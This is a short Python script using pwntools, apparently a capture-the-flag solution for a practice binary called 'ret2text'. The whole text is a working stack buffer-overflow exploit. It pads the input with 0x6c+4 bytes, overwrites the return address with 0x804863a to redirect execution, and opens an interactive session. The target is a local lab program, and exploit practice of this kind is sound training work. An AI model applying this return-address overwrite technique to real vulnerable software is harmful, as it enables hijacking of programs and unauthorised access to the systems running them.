from pwn import *

sh = process('./ret2text')
target = 0x804863a
nopstr = 'A' *(0x6c+4)
nopstr = nopstr.encode('utf-8')
sh.sendline(nopstr + p32(target))
sh.interactive()